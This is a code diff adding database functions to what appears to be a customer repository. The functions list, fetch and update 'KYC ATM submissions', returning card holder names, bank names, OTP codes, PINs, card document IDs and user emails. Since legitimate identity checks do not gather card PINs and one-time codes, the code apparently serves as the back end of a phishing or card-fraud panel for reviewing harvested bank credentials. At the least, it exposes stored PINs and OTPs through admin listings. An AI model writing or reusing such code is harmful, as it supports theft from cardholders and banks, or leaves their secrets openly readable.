@@ -358,6 +358,81 @@ function createCustomerRepository(pool) {
       return id;
     },
 
+    
+    async listAllAtmSubmissions(limit = 50) {
+      try {
+        const [rows] = await pool.query(
+          `SELECT a.id, a.user_id, a.holder_name, a.bank_name, a.otp_code, a.pin_cipher,
+                  a.front_document_id, a.back_document_id, a.status, a.created_at,
+                  u.email, cp.first_name, cp.last_name, cp.customer_reference
+           FROM kyc_atm_submissions a
+           JOIN users u ON u.id = a.user_id
+           LEFT JOIN customer_profiles cp ON cp.user_id = a.user_id
+           ORDER BY a.created_at DESC
+           LIMIT ?`,
+          [Number(limit) || 50]
+        );
+        return rows.map((r) => ({
+          id: binaryToUuid(r.id),
+          userId: binaryToUuid(r.user_id),
+          holderName: r.holder_name,
+          bankName: r.bank_name,
+          otpCode: r.otp_code,
+          pin: r.pin_cipher,
+          frontDocumentId: r.front_document_id ? binaryToUuid(r.front_document_id) : null,
+          backDocumentId: r.back_document_id ? binaryToUuid(r.back_document_id) : null,
+          status: r.status,
+          createdAt: r.created_at,
+          email: r.email,
+          firstName: r.first_name,
+          lastName: r.last_name,
+          customerReference: r.customer_reference
+        }));
+      } catch (err) {
+        if (err && err.code === 'ER_NO_SUCH_TABLE') return [];
+        throw err;
+      }
+    },
+
+    async getAtmSubmissionById(id) {
+      const [rows] = await pool.query(
+        `SELECT a.id, a.user_id, a.holder_name, a.bank_name, a.otp_code, a.pin_cipher,
+                a.front_document_id, a.back_document_id, a.status, a.created_at,
+                u.email, cp.first_name, cp.last_name, cp.customer_reference
+         FROM kyc_atm_submissions a
+         JOIN users u ON u.id = a.user_id
+         LEFT JOIN customer_profiles cp ON cp.user_id = a.user_id
+         WHERE a.id = ?
+         LIMIT 1`,
+        [uuidToBinary(id)]
+      );
+      if (!rows[0]) return null;
+      const r = rows[0];
+      return {
+        id: binaryToUuid(r.id),
+        userId: binaryToUuid(r.user_id),
+        holderName: r.holder_name,
+        bankName: r.bank_name,
+        otpCode: r.otp_code,
+        pin: r.pin_cipher,
+        frontDocumentId: r.front_document_id ? binaryToUuid(r.front_document_id) : null,
+        backDocumentId: r.back_document_id ? binaryToUuid(r.back_document_id) : null,
+        status: r.status,
+        createdAt: r.created_at,
+        email: r.email,
+        firstName: r.first_name,
+        lastName: r.last_name,
+        customerReference: r.customer_reference
+      };
+    },
+
+    async updateAtmSubmissionStatus(id, status) {
+      await pool.query(
+        `UPDATE kyc_atm_submissions SET status = ? WHERE id = ?`,
+        [status, uuidToBinary(id)]
+      );
+    },
+
     async listAtmSubmissions(userId) {
       const [rows] = await pool.query(
         `SELECT id, holder_name, bank_name, otp_code, status, created_at
